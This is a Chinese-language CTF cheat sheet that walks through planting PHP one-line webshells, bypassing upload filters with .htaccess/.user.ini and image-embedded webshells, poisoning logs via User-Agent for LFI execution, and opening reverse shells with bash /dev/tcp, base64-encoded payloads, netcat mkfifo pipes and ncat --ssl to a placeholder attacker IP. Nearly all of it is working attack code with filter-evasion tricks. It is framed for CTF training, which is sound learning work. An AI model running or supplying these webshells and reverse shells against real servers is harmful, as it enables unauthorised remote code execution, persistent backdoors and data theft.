## [getshell] 一句话 GetShell 速查——拿到上传/写入/包含点后，最快落地一句话木马。
### [shell-php] PHP 一句话木马速查 | easy | webshell;一句话;getshell;PHP | 一句话木马;eval;assert;蚁剑
> 最常用 PHP 一句话及其连接方式
#### 这个条目的作用
拿到一个能上传文件或写入文件的位置（上传点、编辑器、备份恢复、SQL 写文件等）之后，放一个「一句话木马」，就能通过 POST 参数执行任意 PHP 代码，进而执行系统命令、读 flag。这是 PHP 题从「能写文件」到「能执行」的最后一公里。
#### 前置条件
- 靶机 URL（如 `http://target/`）
- 一个上传点或写入点，且上传的文件能被浏览器直接访问（访问路径要记下来）
- 本机有 `curl`（Windows 用 PowerShell 也行，但命令略有差别）；或装好蚁剑（AntSword）
- 默认你已经会：发送 HTTP 请求、知道「上传成功后文件放在哪个目录」
#### 第 1 步：确认 PHP 环境真的能解析
操作：先上传一个最普通的探测文件 `info.php`，内容只有一行：

```php
<?php phpinfo();?>
```

预期结果：浏览器访问 `http://target/upload/info.php`（目录按你实际上传的位置填）能打开 PHP 版本信息页。如果直接显示源代码字符串，说明该目录不解析 PHP，先别继续，去看 `shell-htaccess` 或换上传目录。
如果不行：访问 404 → 路径猜错，看上传成功的响应或题目提示；显示源码 → 目录不可执行，换目录。
#### 第 2 步：上传一句话木马
操作：新建 `shell.php`，内容选一种写进去（按环境挑）：

```php
<?php @eval($_POST['x']);?>
<?php @system($_POST['x']);?>        // 有回显命令执行，最简单粗暴
<?php @passthru($_POST['x']);?>      // 输出原始结果，适合二进制输出
<?php $_GET['a']($_GET['b']);?>      // 动态函数：?a=system&b=id
<?php @eval($_REQUEST['x']);?>       // $_REQUEST 兼容 GET/POST/Cookie
```

然后通过上传点传上去。`.php` 后缀被拦就参考上传绕过类条目（改后缀、改 Content-Type、`.phtml` 等）。
预期结果：上传返回成功，且能访问到 `shell.php`（访问时页面应该是空白——这是正常的，一句话无输出）。
如果不行：上传失败/被删 → 是过滤问题，先解决上传检测；能访问但 500 报错 → 代码里引号或语法问题，检查是不是被转义。
#### 第 3 步：用 curl 验证命令执行
操作：终端执行（`x` 就是一句话里的密码参数名）：

```bash
curl -s http://target/upload/shell.php -d 'x=system("id");'
curl -s http://target/upload/shell.php -d 'x=system("cat /flag");'
```

预期结果：第一条返回 `uid=33(www-data) gid=33(www-data)...`，说明命令执行成功。这一步成功 = getshell 完成。
如果不行：返回空白 → 换 `phpinfo();` 试试是不是 eval 被禁（`disable_functions`），或换 `assert`/`call_user_func` 写法；返回 500 → payload 语法问题。
#### 第 4 步：用蚁剑建立图形化连接（可选但推荐）
操作：打开蚁剑 → 右键「添加数据」→ URL 填 `http://target/upload/shell.php`，连接密码填 `x`，连接类型选 PHP，编码器默认即可。
预期结果：双击出现文件管理界面，能看到网站根目录，右键可开终端。
如果不行：连不上 → 回到第 3 步先确认 curl 能通；能连但命令被禁 → 在蚁剑「插件市场」装绕过 disable_functions 插件（LD_PRELOAD / PHP-FPM 模式）。
#### 第 5 步：找 flag 并收尾
操作：终端里按顺序找：

```bash
id; uname -a
ls / ; ls /var/www/html
find / -name '*flag*' 2>/dev/null
cat /flag /flag.txt /flag.php 2>/dev/null
```

预期结果：找到 flag 文件并读出内容。
如果不行：常见 flag 位置都没有 → 看题目提示、`env`、数据库（`mysql -uroot`）里也可能藏。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 上传成功但访问 404 | 上传目录/文件名猜错 | 看上传响应、题目源码里的路径；多试 `upload uploads files static img` |
| 访问显示源码不执行 | 该目录不解析 PHP | 换目录；用 `.htaccess`/`.user.ini`（见 shell-htaccess） |
| curl 返回空白 | eval/命令被 disable_functions 禁 | 换 `system`/`passthru`/`assert` 写法；phpinfo 看禁用列表 |
| assert 写法没反应 | PHP 7.2 起 assert 字符串执行废弃、8.0 移除 | 换 `eval` 或 `call_user_func` |
| 页面 500 | 代码语法错、引号被转义 | 检查上传后的实际内容（访问源码），重传 |
| 蚁剑连不上 | 密码参数名不匹配 | 确认一句话里 `$_POST['x']` 与蚁剑密码都是 `x` |
#### 实战要点
- 一句话越短越好：`<?php @eval($_POST['x']);?>` 是黄金标准，蚁剑/菜刀/哥斯拉通吃。
- 连接后第一件事：`id` 看权限、`pwd` 看位置，别急着翻 flag。
- 用 `@` 抑制报错，避免把 payload 细节泄露到日志/页面。
- `assert` 只适用于老 PHP（<7.2 靶场），新环境别依赖；`eval` 最稳。
- 比赛结束记得删马：`rm shell.php`（线下赛约定俗成，别留后门给别人）。
- 题目禁用函数时，蚁剑的 bypass disable_functions 插件是第一选择，别手写绕。
### [shell-htaccess] .htaccess / .user.ini 解析绕过 | medium | 文件上传;getshell;htaccess;user.ini | htaccess上传;user.ini;解析漏洞
> 通过配置文件让任意后缀被解析成 PHP
#### 这个条目的作用
上传功能把 `.php` 后缀拉黑了、但放行图片/配置文件时，上传一个「解析配置文件」，让服务器把 `.jpg`、`.png` 当 PHP 解析——这样图片马就能直接执行，绕过后缀黑名单 getshell。
#### 前置条件
- 靶机是 Apache（`.htaccess`）或 PHP-FPM/CGI 环境（`.user.ini`）
- 上传点允许上传隐藏文件（`.` 开头）或未过滤配置文件后缀
- 默认你会：用 curl 上传/访问文件、知道上传目录路径
#### 第 1 步：判断服务器环境
操作：看响应头：

```bash
curl -sI http://target/ | grep -i server
```

预期结果：`Server: Apache/2.4.x (Ubuntu)` → 走 `.htaccess` 路线；看不到 Apache（Nginx 或反代）→ 优先试 `.user.ini`（PHP-FPM 常见）并配合同目录的 php 文件。
如果不行：响应头被隐藏，直接两个方案都试，成本很低。
#### 第 2 步：上传 .htaccess 让 .jpg 按 PHP 解析
操作：新建 `.htaccess`，内容：

```apache
AddType application/x-httpd-php .jpg
```

上传到**上传目录**。如果上传点拒绝 `.htaccess` 文件名，试试改成 `htaccess` 传上去再想办法改回、或用 Burp 改文件名。
预期结果：上传成功且访问能看到该文件存在（`curl -sI http://target/upload/.htaccess` 返回 200）。
如果不行：直接 403/拒绝上传 → 上传点过滤了配置文件，此路不通，改用 `.user.ini` 或找其他入口。
#### 第 3 步：上传图片马并访问验证
操作：上传 `shell.jpg`（内容是一句话，制作方法见 shell-img）：

```php
<?php @eval($_POST['x']);?>
```

然后访问并连接：

```bash
curl -s http://target/upload/shell.jpg -d 'x=system("id");'
```

预期结果：返回 `uid=...` 命令执行结果 = 解析绕过成功。
如果不行：返回的是图片二进制或空白无反应 → `AllowOverride` 没开或 Apache 用的是 php-fpm（mod_php 才认 `AddType application/x-httpd-php`）。换 `.user.ini` 方案。
#### 第 4 步：备用方案——.user.ini 自动包含
操作：上传两个文件到**同一个有 php 文件的目录**：
`a.png`（内容一句话 `<?php @eval($_POST['x']);?>`）和 `.user.ini`：

```ini
auto_prepend_file=a.png
```

预期结果：上传后等 30~300 秒（缓存），访问同目录任意 `.php`（如 `index.php`），页面空白但 `curl -d 'x=system("id");'` 能执行命令。
如果不行：不生效 → 检查 `.user.ini` 里路径是否为相对路径、同目录是否有 php 文件可访问、缓存是否还没过期。
#### 第 5 步：确认 getshell 并找 flag
操作：

```bash
curl -s http://target/upload/index.php -d 'x=system("cat /flag");'
```

预期结果：拿到 flag 内容。
如果不行：flag 不在根目录 → `find / -name '*flag*' 2>/dev/null` 或看题目源码。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `.htaccess` 传不上去 | 黑名单拦隐藏文件/配置文件 | Burp 改名、双写、加空格点结尾绕过；换 `.user.ini` |
| jpg 访问是下载/原样输出 | AllowOverride 未开，或 Apache 走 php-fpm | `AddType` 对 php-fpm 无效；改 `.user.ini` |
| `.user.ini` 不生效 | 缓存未过 / 路径不对 / 同目录无 php | 等 300 秒；值写相对路径 `a.png`；确认能访问同目录 php |
| 访问报 500 | 马的语法被二次处理坏 | 重新上传，检查引号 |
| 图片马执行但蚁剑连不上 | 密码参数不匹配 | 统一 `x`；用 curl 先验证 |
#### 实战要点
- `AddType application/x-httpd-php .jpg` 只对 Apache mod_php 生效；Nginx + php-fpm 环境请直接用 `.user.ini`。
- `.user.ini` 的生效范围是**所在目录及子目录**，且必须能访问到同目录的 php 文件。
- `user_ini.cache_ttl` 默认 300 秒：上传后没反应别急着放弃，等几分钟再试。
- 一次把 `.htaccess` + 图片马 + `.user.ini` 三件套都传上去，哪个生效用哪个，比赛时间最宝贵。
- 传 `.htaccess` 时如果被改文件名，观察返回/访问路径确认最终落盘名。
### [shell-img] 图片马制作 | easy | 文件上传;getshell;图片马 | 图片马;copy /b;exif;二次渲染
> 把 PHP 代码藏进图片的三种做法
#### 这个条目的作用
上传功能检查了文件头（必须是合法图片）时，把一句话木马「藏」进一张正常图片里，让文件既是图片又是 PHP 代码——配合 LFI 包含、Apache 多后缀解析或 `.htaccess`，就能执行代码。
#### 前置条件
- 一张正常的小图片 `a.jpg`（GIF/PNG 也行）
- 一个上传点（会校验文件头/MIME 的那种）
- 后续至少有一个执行出口：LFI 包含点、Apache 多后缀解析、或 `.htaccess`（见 shell-htaccess）
- 默认你会：终端操作、上传文件、用 curl 访问
#### 第 1 步：准备一句话代码
操作：新建 `shell.txt`（不要用 .php 结尾，避免上传直接被拦），内容：

```php
<?php @eval($_POST['x']);?>
```

预期结果：文件存在，内容正确。这一步没有失败可能，但注意别用记事本在行尾加多余字符。
#### 第 2 步：把代码拼进图片（方法一：直接拼接）
操作：Windows 终端或 Linux 终端：

```bash
# Windows
copy /b a.jpg + shell.txt s.jpg
# Linux
cat a.jpg shell.txt > s.jpg
```

预期结果：生成 `s.jpg`。检查文件头还是图片：

```bash
xxd s.jpg | head -1     # 应看到 ffd8（jpg 文件头）
# 或
head -c 3 s.jpg | xxd   # 47 49 46 = GIF；ff d8 ff = JPG
```

如果不行：`copy` 报错 → 路径/文件名问题，检查当前目录文件是否存在。
#### 第 3 步：上传并确认「看起来是图片」
操作：上传 `s.jpg`，然后访问：

```bash
curl -sI http://target/upload/s.jpg | grep -i content-type
```

预期结果：返回 `image/jpeg`（或服务器正常展示图片），说明通过了文件头校验。
如果不行：上传被拒 → 校验不只是文件头（可能检查整文件结构/二次渲染），跳到第 5 步的 EXIF 或二次渲染方案。
#### 第 4 步：让图片马生效（关键一步）
操作：根据靶场环境选一个出口来执行图片里的代码：

```bash
# 出口 1：LFI 包含（参数值改成图片路径）
curl -s 'http://target/index.php?file=/var/www/html/upload/s.jpg' -d 'x=system("id");'

# 出口 2：Apache 多后缀（上传时直接把马命名为 shell.php.jpg）
curl -s http://target/upload/shell.php.jpg -d 'x=system("id");'
```

预期结果：某个出口返回 `uid=...` 执行结果。
如果不行：全部空白 → 看这个条目的 [!danger] 提示：图片马本身不能执行，必须先找到可用的包含点或解析漏洞，否则上传成功也白搭。
#### 第 5 步：EXIF 注释写马（方法二）
操作：本机装 exiftool 后：

```bash
exiftool -Comment='<?php @eval($_POST["x"]);?>' a.jpg
```

预期结果：`a.jpg` 的 EXIF 注释里带上了马，文件头仍是合法 jpg，上传后同样需要包含点配合。
如果不行：没有 exiftool → `apt install exiftool` 或跳过此法，用拼接法。
#### 第 6 步：对付二次渲染（方法三）
操作：如果服务端用 GD 库重画图片（二次渲染会剥掉尾部拼接的马），用现成工具（如 `gif二次渲染马生成器`、ImageTragick 工具集）自动定位渲染前后不变的字节块，把马插进去再上传。
预期结果：上传后下载回来对比，马的字节仍然存在。
如果不行：工具找不到 → 手动思路：对同一张图用不同内容多次上传，diff 前后版本找稳定块，把马插在稳定块中。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 上传后图片打不开 | 拼接顺序错/文件头被破坏 | 重新 `copy /b 图片 + 马`，先验证文件头 |
| 包含后不执行 | 马被二次渲染剥离 | 换 EXIF 法或二次渲染工具 |
| 图片能看但上传被拒 | 校验了整文件结构 | 换 GIF（容错高）、用二次渲染工具 |
| 上传成功、包含成功、没输出 | 出口不对，图片马没被当 PHP | 确认 LFI 是否真的解析了图片内容；换多后缀/htaccess |
| 拼接后马在文件尾但 PHP 不执行 | 文件尾被截断 | 确保 `echo` 完后再 `xxd` 检查马在不在 |
#### 实战要点
- **图片马本身不能直接执行**，必须配合 LFI 包含、`.htaccess`、Apache 多后缀（`shell.php.jpg`）三者之一——上传成功 ≠ getshell。
- GIF 对拼接容错最好（文件尾可以随意加字节），jpg 次之。
- 拼接顺序永远是「图片在前、马在后」，别反了。
- 二次渲染是图片马最大天敌，遇到先怀疑它。
- 访问图片马返回 200 但 Content-Type 是 image/jpeg 不代表执行了，执行成功的唯一标准是 curl POST 后有命令回显。
### [shell-loginclude] 日志包含 GetShell | medium | 文件包含;getshell;日志投毒 | 日志包含;access.log;log poisoning
> 把马写进访问日志，再用 LFI 包含执行
#### 这个条目的作用
有文件包含漏洞（LFI）、但没有任何上传点/写入点时，把一句话木马塞进服务器的访问日志（User-Agent 原样记录进日志），再用 LFI 包含日志文件——PHP 解析日志里的马，直接 getshell。
#### 前置条件
- 一个 LFI 参数（如 `?file=xxx`），先用它确认能读文件（见 probe-lfi）
- 知道或能猜出日志路径（Nginx/Apache 常见路径见下文）
- 本机有 curl
- 默认你会：发送带自定义头的 HTTP 请求、知道 LFI 参数怎么填
#### 第 1 步：确认 LFI 能读文件
操作：先用最保险的方式确认包含可用：

```bash
curl -s 'http://target/index.php?file=/etc/passwd'
```

预期结果：页面返回 `root:x:0:0:...` 之类的 passwd 内容。如果读不到（被过滤/路径问题），先解决 LFI 本身，参考 probe-lfi 条目。
如果不行：被过滤 → 试编码/伪协议（`php://filter` 读 index.php 源码确认包含点）；完全没有包含点 → 本条目不适用。
#### 第 2 步：用 User-Agent 往日志里写马
操作：发一个请求，把一句话放在 UA 里（`-A` 指定 User-Agent）。注意日志里双引号常被转义，**优先用无引号写法**：

```bash
# 有引号版（部分环境双引号会被转义成 \" 导致马坏掉）
curl -s http://target/ -A '<?php @eval($_POST["x"]);?>'

# 无引号版（更稳）：用 chr 拼接函数名，避免双引号
curl -s http://target/ -A '<?php $p="ev".chr(97)."l";$p($_POST["x"]);?>'
```

预期结果：请求正常返回（200/404 都无所谓，关键是这一条请求被写进日志）。多打几次（比如 3~5 次）确保日志里有多条。
如果不行：无回显是正常的，日志包含成功后见分晓；UA 里的 `$` 在终端会被 shell 展开，务必用**单引号**包整个 UA。
#### 第 3 步：包含日志文件
操作：逐个试常见日志路径（LFI 参数里填）：

```
?file=/var/log/nginx/access.log
?file=/var/log/apache2/access.log
?file=/var/log/apache/access.log
?file=../../../../var/log/nginx/access.log
```

预期结果：页面出现日志内容，且能看到自己 UA 里的 `<?php ... ?>` 原文。
如果不行：全部空白 → 路径不对，继续试下表里的其他路径；日志太大页面会卡/超时 → 换 `access.log.1`（轮转的旧日志更小）。
#### 第 4 步：连接马执行命令
操作：POST 一个 `x` 参数给包含日志的页面：

```bash
curl -s 'http://target/index.php?file=/var/log/nginx/access.log' -d 'x=system("id");'
```

预期结果：返回 `uid=...` 命令执行结果 = getshell 成功。
如果不行：返回空白但页面之前能看到马 → 马的引号被转义坏了，改用第 2 步的无引号写法重打日志；返回整个日志但没执行 → 该 LFI 不是 PHP 解析（可能是别的语言），或日志里马没写进去。
#### 第 5 步：找 flag 收尾
操作：

```bash
curl -s 'http://target/index.php?file=/var/log/nginx/access.log' -d 'x=system("find / -name *flag* 2>/dev/null");'
curl -s 'http://target/index.php?file=/var/log/nginx/access.log' -d 'x=system("cat /flag");'
```

预期结果：定位并读出 flag。
如果不行：flag 不在常见位置 → 读题目源码（`php://filter` 读 index.php）找线索。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 包含日志空白/超时 | 日志文件巨大 | 用短 payload；试 `access.log.1` 轮转文件 |
| 页面有日志但马不执行 | UA 引号被转义成 `\"` | 用无引号 chr 拼接写法重新打日志 |
| 看不到自己 UA 的马 | 日志没记 UA / 路径不对 | 换路径；确认 UA 长度限制，马写短点 |
| 包含成功但命令无回显 | 日志里的马语法坏 | 重新打日志（先清空思路：新 UA 会 append，旧的坏马还在，不影响新马） |
| LFI 连 /etc/passwd 都读不了 | 过滤/伪协议限制 | 先解决 LFI（probe-lfi 条目），再回来 |
#### 实战要点
- 日志路径表（按优先级试）：Nginx `/var/log/nginx/access.log`；Apache `/var/log/apache2/access.log`、`/var/log/apache/access.log`；源码编译 Nginx `/usr/local/nginx/logs/access.log`；Docker 内路径与宿主机相同。
- UA 里永远优先无引号写法：`<?php $p="ev".chr(97)."l";$p($_POST["x"]);?>`，双引号在日志里十有八九被转义。
- 日志会越滚越大，包含很卡——用最短的马、打 2~3 条就够。
- 同一思路还能打 `/proc/self/environ`（环境变量含 UA）和 session 文件（先传参数把马写进 session）。
- 马写进日志后，**日志还会继续追加**，所以每次连接 POST 都在往日志里写新请求行——连接时页面越来越长是正常的。
- 靶场 Nginx 默认记录 UA 原样；若环境把 UA 里的 `<`/`>` 过滤，换 base64 编码马写入。
## [reverseshell] 反弹 Shell 速查——拿到命令执行后，第一时间反弹到本地监听。
### [rs-bash] Bash / Sh 反弹 | easy | 反弹shell;RCE;bash | reverse shell;bash -i;/dev/tcp
> 最常用的 bash /dev/tcp 反弹
#### 这个条目的作用
拿到一个命令执行点（命令注入、webshell、SSTI RCE 等）之后，反弹一个交互式 shell 回本地，比在注入点里一条条敲命令舒服得多——能用 vim、能跑交互工具、操作和本地终端一样。这是 RCE 后的标准动作。
#### 前置条件
- 一个能执行命令的入口（命令注入参数 / webshell POST / RCE 点）
- 一台监听机（Kali 或自己电脑），知道它的 IP；**监听机和靶机网络要互通**
- 监听机上装了 netcat（`nc`），且反弹端口（如 4444）没被防火墙挡
- 默认你会：开终端、知道自己电脑的 IP、在注入点里发 payload
#### 第 1 步：本地先开监听（永远先开）
操作：本机终端：

```bash
nc -lvnp 4444
```

预期结果：显示 `Listening on 0.0.0.0 4444` 并挂起等待连接。这一步不成功后面全白搭。
如果不行：`nc` 不存在 → `apt install netcat-openbsd` 或 Windows 用 `ncat`；端口被占 → 换 4445 等，记下端口。
#### 第 2 步：确认监听机 IP
操作：另开一个终端：

```bash
ip addr | grep 'inet '    # Linux；Windows: ipconfig
```

预期结果：拿到一个内网 IP，形如 `192.168.1.10`。反弹命令里 `YOUR_IP` 就替换成它。
如果不行：靶机在公网/云环境 → 用你 VPS 的公网 IP，且安全组要放行 4444。
#### 第 3 步：在注入点执行反弹命令
操作：把下面的 `YOUR_IP` 换成你的 IP、`4444` 换成监听端口，在命令执行点执行：

```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

预期结果：监听终端突然出现 `connect to [你的IP] from (unknown) ...` 和 `bash-5.1$` 提示符，输入 `id` 有回显 = 反弹成功。
如果不行：没有任何连接进来 → 空格被过滤/特殊字符被吃，用第 4 步的编码版；`/dev/tcp` 不可用（靶机 shell 不是 bash）→ 换 `sh` 变体或 python 反弹。
#### 第 4 步：命令注入点里的编码版（最常用）
操作：命令注入参数经常过滤空格和 `&`，URL 编码版直接填进参数：

```
;bash%20-i%20>%26%20/dev/tcp/YOUR_IP/4444%200>%261
```

或更稳的 base64 版（先本机生成再替换 IP）：

```bash
# 本机：echo -n 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' | base64
# 把生成的串填进下面命令，在靶机执行：
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ== | base64 -d | bash
```

预期结果：监听端收到 shell。base64 版只含字母数字和 `|`，几乎不会被过滤。
如果不行：`|` 也被过滤 → 换 python 反弹（rs-python）；过滤了 `bash` 字样 → 命令用 `$(echo YmFzaA==|base64 -d)` 拼出来。
#### 第 5 步：验证并加工 shell
操作：在反弹回来的 shell 里：

```bash
id; whoami; pwd
```

预期结果：能执行并看到输出。接着可以按 rs-helper 条目升级成交互式 TTY（python pty / stty）。
如果不行：shell 一进来就断 → 加 `bash -c '...'` 包裹或 `setsid`/`nohup` 方式执行。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 监听端没任何反应 | 反弹命令没执行 / IP 或端口错 / 防火墙 | 先本地 `nc -lvnp 4444` 确认监听在；换编码版；换端口 80/443 |
| 空格被过滤 | 命令注入点过滤了空格 | URL 编码版或 base64 版 |
| `&` 被过滤/被 URL 截断 | `&` 是 URL 参数分隔符 | 整个 payload URL 编码（`%26`）；或 base64 版 |
| `/dev/tcp` 报 no such file | 靶机默认 shell 不是 bash | 用 `sh -i >& /dev/tcp/...` 或 python/nc 反弹 |
| 一弹就连上但马上断 | 无交互 TTY/信号问题 | 用 `bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'`；本地 `rlwrap nc -lvnp 4444` |
| 反弹成功但命令无输出 | shell 非交互 | `python3 -c 'import pty;pty.spawn("/bin/bash")'` 升级 TTY |
#### 实战要点
- **监听永远先开**，再发反弹命令；顺序反了会丢连接。
- `bash -i >& /dev/tcp/IP/4444 0>&1` 是黄金命令，Linux 靶场 90% 一次成功。
- 命令注入点里首选 base64 版：`echo ... | base64 -d | bash`，空格、`&`、引号全避开。
- IP 写错是头号翻车点：填之前 `ip addr` 确认，云靶机用公网 IP。
- 反弹端口用 4444 之类的高位端口；被防火墙卡就换 80/443。
- 靶机没 bash（busybox 容器）用 `sh` 变体或 python/nc，优先级见 rs-helper 条目。
### [rs-nc] Netcat / OpenBSD nc 反弹 | easy | 反弹shell;nc;ncat | nc -e;ncat;netcat反弹
> nc 与 ncat 的反弹与监听
#### 这个条目的作用
靶机上恰好有 netcat 时，用 nc 一行反弹 shell。nc 版本不同语法差别很大（`-e` 只有 GNU 版有），本条目把各版本写法都列全，照着选一个能用的。
#### 前置条件
- 命令执行点（注入点/webshell）
- 监听机有 `nc`（或 `ncat`），端口 4444 未占用
- 靶机上有 `nc`——不确定就先探测
- 默认你会：开监听、在注入点执行命令
#### 第 1 步：先开监听
操作：本机终端：

```bash
nc -lvnp 4444
```

预期结果：显示 `Listening on 0.0.0.0 4444`。
如果不行：nc 缺失 → `apt install netcat-openbsd`；Windows 监听用 `ncat -lvnp 4444`。
#### 第 2 步：探测靶机 nc 版本
操作：在命令执行点执行：

```bash
nc -h 2>&1 | head -20
```

预期结果：输出里包含 `-e` 说明是 GNU netcat（传统版）；包含 `-c` 说明是 OpenBSD 版；报 command not found 说明靶机没 nc（跳到第 5 步）。
如果不行：`nc -h` 无输出但 nc 存在 → 直接盲试 `-e` 写法，失败再换 `-c` 和管道法。
#### 第 3 步：GNU nc（带 -e）直接反弹
操作：靶机执行（替换 `1.2.3.4` 为你的 IP）：

```bash
nc -e /bin/sh 1.2.3.4 4444
nc -e /bin/bash 1.2.3.4 4444
```

预期结果：监听端出现 `connect to ...`，有 `$` 提示符，`id` 有回显。
如果不行：监听没反应 → 大概率靶机是 OpenBSD nc（没 `-e`），走第 4 步；报 `invalid option` → 同前。
#### 第 4 步：OpenBSD nc（无 -e）用管道法
操作：靶机执行：

```bash
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f
```

预期结果：监听端拿到交互 shell。这行把 `/tmp/f` 命名管道串成双向通道，是 OpenBSD 版标准姿势。
如果不行：`mkfifo` 被禁（无权限/只读）→ 用 bash /dev/tcp 或 python 反弹；断连 → 监听端加 `rlwrap`。
#### 第 5 步：靶机没 nc 时的降级方案
操作：直接在注入点换用别的反弹（本条目配套）：

```bash
# bash 版（Linux 几乎必有）
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

预期结果：监听端收到 shell。多数场景 bash 版比 nc 更可靠，nc 只是备选。
如果不行：也没 bash → python 反弹（rs-python 条目）。
#### 第 6 步：Ncat 加密反弹（可选）
操作：监听机：

```bash
ncat -lvnp 4444 --ssl
```

靶机：

```bash
ncat --ssl 1.2.3.4 4444 -e /bin/sh
```

预期结果：TLS 加密通道建立，监听端有 shell。流量不可见，适合有流量审计的靶场。
如果不行：ncat 缺失 → 装 nmap（自带 ncat）；靶机没 ncat → 此方案跳过。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 报 `invalid option -- e` | 靶机是 OpenBSD nc，无 `-e` | 用第 4 步管道法或 `-c /bin/sh` |
| 监听无连接 | 命令没执行/IP 错/防火墙 | 确认端口放行；换 bash 反弹；检查命令注入点是否真的执行了 |
| shell 一进就断 | 无交互 TTY | `rlwrap nc -lvnp 4444` 监听；反弹后 python 提 TTY |
| 报 command not found | 靶机没 nc | bash /dev/tcp 或 python 反弹 |
| 反弹成功但输入回显乱 | 终端模式问题 | `stty raw -echo; fg`（见 rs-helper） |
#### 实战要点
- 版本判断一句话：`nc -h` 有 `-e` 是 GNU，有 `-c` 是 OpenBSD——先判断再选写法，别盲试。
- 很多 Linux 发行版默认 nc 是 OpenBSD 版，**`-e` 报错是常态**，直接背管道法。
- 管道法 `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP 4444 > /tmp/f` 是 OpenBSD 环境唯一靠谱姿势。
- 靶机没 nc 时 bash `/dev/tcp` 通常比装 nc 快得多，优先级：bash > python > nc。
- ncat `--ssl` 能加密流量，遇到抓流量/IDS 靶场优先用。
